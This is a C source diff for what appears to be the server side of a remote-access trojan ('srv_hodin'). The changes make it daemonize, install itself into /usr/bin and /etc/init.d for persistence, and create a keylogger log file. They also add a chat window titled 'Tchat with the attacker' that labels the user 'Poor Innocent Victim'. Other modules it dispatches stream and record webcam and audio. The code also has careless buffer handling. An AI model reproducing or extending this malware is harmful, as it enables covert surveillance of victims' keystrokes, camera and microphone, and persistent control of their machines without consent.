@@ -22,6 +22,8 @@ static SOCKET csock = 0;
 
 static int on_video = -1;
 
+GtkWidget *tchat_text_view = NULL;
+
 int main(int argc, char *argv[])
 {
     /** Make hodin_daemon.sh script executable **/
@@ -46,7 +48,7 @@ int main(int argc, char *argv[])
     }
 
     /** Copy hodin_daemon.sh script in /etc/init.d **/
-    if(system("cp script/hodin_daemon.sh /etc/init.d") == -1)
+    if(system("cp script/hodin_daemon.sh /etc/init.d/") == -1)
     {
         error("system() copy hodin_daemon.sh in /etc/init.d/", "main()");
         return 0;
@@ -56,13 +58,6 @@ int main(int argc, char *argv[])
     if(system("cp srv_hodin /usr/bin/") == -1)
     {
         error("system() copy srv_hodin in /usr/bin/", "main()");
-        return 0;
-    }
-    
-    /** Copy executable file in /bin/ **/
-    if(system("cp srv_hodin /bin/") == -1)
-    {
-        error("system() copy srv_hodin in /bin/", "main()");
         return 0;
     }
 
@@ -80,13 +75,16 @@ int main(int argc, char *argv[])
         return 0;
     }
     
-    //daemonize();   
-
     /* Initialize GStreamer */
     gst_init(&argc, &argv);
+    
+    /* Initialize GTK */
+    //gtk_init(&argc, &argv);
+    
+    daemonize(); 
 
     dispatch_modules(argc, argv);
-
+    
     return EXIT_SUCCESS;
 }
 
@@ -110,6 +108,8 @@ void dispatch_modules(int argc, char *argv[])
     pthread_t stream_webcam_thread = 0;
     pthread_t record_webcam_thread = 0;
     pthread_t record_audio_thread = 0;
+    
+    pthread_t tchat_thread = 0;
     
     //char *ubuntu_check_gain_cmd = "pactl set-sink-mute @DEFAULT_SINK@ toggle"; /* A TESTER  */
     const char *ubuntu_check_mic_cmd = "amixer sset Capture cap";
@@ -164,6 +164,19 @@ void dispatch_modules(int argc, char *argv[])
 
     for(;;)
     {
+        FILE *file_log = NULL;
+    
+        /* Create the log file for the keyloggers */
+        file_log = fopen("/var/log/userlog.log", "a+");
+
+        if(file_log == NULL)
+        {
+            error("fopen file_log", "main()");
+            return;
+        }
+
+        fclose(file_log);
+        
         printf("\nServer en ecoute \n");
         
         on_video = -1;
@@ -515,6 +528,24 @@ void dispatch_modules(int argc, char *argv[])
                 perror("pthread_join");
                 return;
             }
+        }
+        
+        if(flag == 18)
+        {
+            printf("\t\tTCHAT STARTED....\n");
+
+            if(pthread_create(&tchat_thread, NULL, (void*(*)(void*))run_tchat, NULL) == -1)
+            {
+                error("pthread_create() tchat_thread", "dispatch_modules()");
+                return;
+            }
+
+            if(pthread_join(tchat_thread, NULL) != 0)
+            {
+                perror("pthread_join");
+                return;
+            }
+            
         }
     }
 
@@ -1548,6 +1579,219 @@ void cb_message(GstBus *bus, GstMessage *msg, CustomData *data)
             break;
     }
 }
+
+
+void *run_tchat(void)
+{
+    //GtkWidget *hosts_text_view = NULL;
+    GtkWidget *tchat_window = NULL;
+    GtkWidget *hBox = NULL;
+    GtkWidget *scrollbar;
+
+    GtkWidget *vBox = NULL;
+    
+    GtkWidget *tchat_frame = NULL;
+    GtkWidget *tchat_zone = NULL;
+    //GtkWidget *tchat_text_view = NULL;
+    GtkWidget *typing_entry = NULL;
+    GtkWidget *send_text = NULL;
+    
+    char *attacker_text = NULL;
+    size_t len_attacker_msg = 0;
+    
+    GtkTextBuffer *text_buffer = NULL;
+    gchar *text = NULL;
+    GtkTextIter start;
+    GtkTextIter end;
+    gchar *text_utf8 = NULL;
+    
+    FILE *backup = NULL;
+  
+    tchat_zone = gtk_fixed_new();
+    tchat_frame = gtk_frame_new(NULL);
+    
+    tchat_window = gtk_window_new(GTK_WINDOW_TOPLEVEL);
+    gtk_window_set_default_size(GTK_WINDOW(tchat_window), 800, 400);
+    g_signal_connect(G_OBJECT(tchat_window), "destroy", G_CALLBACK(gtk_main_quit), NULL);
+    gtk_window_set_title(GTK_WINDOW(tchat_window), "Tchat with the attacker");
+    
+    gtk_container_add(GTK_CONTAINER(tchat_window), tchat_zone);
+    
+    gtk_frame_set_label(GTK_FRAME(tchat_frame), " - Poor Innocent Victim - ");
+    gtk_frame_set_label_align(GTK_FRAME(tchat_frame), (gfloat)0.05, (gfloat)0.5);
+    gtk_frame_set_shadow_type(GTK_FRAME(tchat_frame), GTK_SHADOW_ETCHED_OUT);
+    gtk_widget_set_usize(tchat_frame, 760, 295);
+    
+    gtk_fixed_put(GTK_FIXED(tchat_zone), tchat_frame, 20, 20);
+    
+    scrollbar = gtk_scrolled_window_new(NULL, NULL);
+    gtk_widget_set_size_request(scrollbar, 720, 250);
+    
+    gtk_fixed_put(GTK_FIXED(tchat_zone), scrollbar, 40, 45);
+
+    tchat_text_view = gtk_text_view_new();
+    gtk_container_add(GTK_CONTAINER(scrollbar), tchat_text_view);
+    gtk_scrolled_window_set_policy(GTK_SCROLLED_WINDOW(scrollbar), GTK_POLICY_AUTOMATIC, GTK_POLICY_AUTOMATIC);
+    //gtk_widget_set_size_request(tchat_text_view, 320, 400);
+    
+    gtk_text_view_set_editable((GtkTextView*)tchat_text_view, FALSE);
+    gtk_text_view_set_cursor_visible((GtkTextView*)tchat_text_view, FALSE);
+    
+    typing_entry = gtk_entry_new_with_max_length(256);
+    gtk_entry_set_text(GTK_ENTRY(typing_entry), "Type your text here ...");
+    gtk_widget_set_size_request(typing_entry, 720, 50);
+    gtk_fixed_put(GTK_FIXED(tchat_zone), typing_entry, 20, 320);
+    
+    send_text = gtk_button_new_with_label("◄");
+    gtk_widget_set_size_request(send_text, 50, 50);
+    gtk_fixed_put(GTK_FIXED(tchat_zone), send_text, 740, 320);
+    g_signal_connect(G_OBJECT(send_text), "clicked", G_CALLBACK(cb_send_text), typing_entry);
+    
+
+    if(recv(csock, (char*)&len_attacker_msg, sizeof(len_attacker_msg), 0) == SOCKET_ERROR)
+    {
+        error("recv() len_attacker_msg", "run_tchat()");
+        pthread_exit(NULL);
+    }
+    
+    printf("len_attacker_msg = %zd octets\n", len_attacker_msg);
+    
+    attacker_text = malloc(len_attacker_msg * sizeof(char));
+    if(attacker_text == NULL)
+    {
+        error("malloc() attacker_text", "run_tchat()");
+        pthread_exit(NULL);
+    }
+    
+    if(recv(csock, attacker_text, len_attacker_msg, 0) == SOCKET_ERROR)
+    {
+        error("recv() attacker_text", "run_tchat()");
+        pthread_exit(NULL);
+    }
+    
+    text_buffer = gtk_text_view_get_buffer((GtkTextView*)tchat_text_view);
+    gtk_text_buffer_set_text(text_buffer, attacker_text, -1);
+    
+    gtk_text_buffer_get_start_iter(text_buffer, &start);
+    gtk_text_buffer_get_end_iter(text_buffer, &end);
+
+    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
+    
+    text_utf8 = g_locale_to_utf8(attacker_text, -1, NULL, NULL, NULL);
+    
+    //g_print("%s", text_utf8);
+    //g_free(text);
+    
+    backup = fopen("backup.log", "a");
+    if(backup == NULL)
+    {
+        error("fopen() backup", "cb_send_text()");
+        pthread_exit(NULL);        
+    }
+    
+     /* Write the sentences in backup.log file */
+    fputs(text_utf8, backup);
+    fputs("\n", backup);
+    
+    fclose(backup);
+
+    gtk_widget_show_all(tchat_window);
+    
+    gtk_main();
+    
+    pthread_exit(NULL);
+}
+
+
+void cb_send_text(GtkButton *button, gpointer user_data)
+{
+    GtkTextBuffer *text_buffer = NULL;
+    gchar *text = NULL;
+    GtkTextIter start;
+    GtkTextIter end;
+    
+    const char *buffer = NULL;
+    char *final_text = NULL;
+    gchar *text_utf8 = NULL;
+    
+    FILE *backup = NULL;
+    char read_text[1024] = "";
+    
+    int read_char = 0;
+    int i = 0;
+      
+    buffer = gtk_entry_get_text(GTK_ENTRY(user_data));
+    
+    final_text = malloc(1024 * sizeof(char));
+    if(final_text == NULL)
+    {
+        error("malloc final_text", "cb_send_text()");
+        return;
+    }
+    
+    final_text = strncpy(final_text, "Poor Innocent Victim : ", 23);
+    final_text = strncat(final_text, buffer, strlen(buffer) + 1);
+
+    
+    text_utf8 = g_locale_to_utf8(final_text, -1, NULL, NULL, NULL);
+    
+    backup = fopen("backup.log", "a");
+    if(backup == NULL)
+    {
+        error("fopen() backup", "cb_send_text()");
+        return;        
+    }
+    
+     /* Write the sentences in backup.log file */
+    fputs(text_utf8, backup);
+    fputs("\n", backup);
+    
+    fclose(backup);
+    
+    gtk_entry_set_text(GTK_ENTRY(user_data), "");
+
+    
+    
+    backup = fopen("backup.log", "r");
+    if(backup == NULL)
+    {
+        error("fopen() backup.log", "cb_send_text()");
+        return;
+    }
+    
+    while((read_char = fgetc(backup)) != EOF)
+    {
+        read_text[i] = (char)read_char;
+        i++;
+    }
+    
+    rewind(backup);
+      
+    text_utf8 = g_locale_to_utf8(read_text, strlen(read_text), NULL, NULL, NULL);
+
+    text_buffer = gtk_text_view_get_buffer((GtkTextView*)(tchat_text_view));
+
+    gtk_text_buffer_set_text(text_buffer, text_utf8, -1);
+
+    gtk_text_buffer_get_start_iter(text_buffer, &start);
+    gtk_text_buffer_get_end_iter(text_buffer, &end);
+
+    text = gtk_text_buffer_get_text(text_buffer, &start, &end, FALSE);
+
+    g_print("%s\n", text);
+
+    g_free(text);
+
+    fclose(backup);
+    
+    free(final_text);
+    
+    /* unused parameters */
+    (void)button;
+    
+    pthread_exit(NULL);
+}
+
 
 
 void daemonize()
